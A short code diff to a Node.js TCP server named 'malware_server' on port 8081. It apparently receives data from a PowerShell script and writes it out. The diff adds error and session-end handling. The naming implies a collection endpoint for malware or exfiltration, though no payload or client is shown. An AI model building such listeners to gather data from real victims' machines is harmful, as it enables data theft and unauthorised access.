@@ -26,13 +26,23 @@ const malware_server = net.createServer({keepAlive: false}, connection => {
                 else
                 {
                     console.log("Data written.")
-                    console.log("");
                 }
             });
         }
 
+        connection.on("error", err => {
+            console.log(`---\n${err}\n`);
+        });
+
         connection.end();
+    });
+
+    // Usually, you'd expect ECONNRESETS if the .ps1 Script abrutply closes, but this should handle that
+    connection.on("end", () => {
+        console.log("Session Terminated.");
+        console.log("");
     })
+
 });
 
 malware_server.listen(8081);
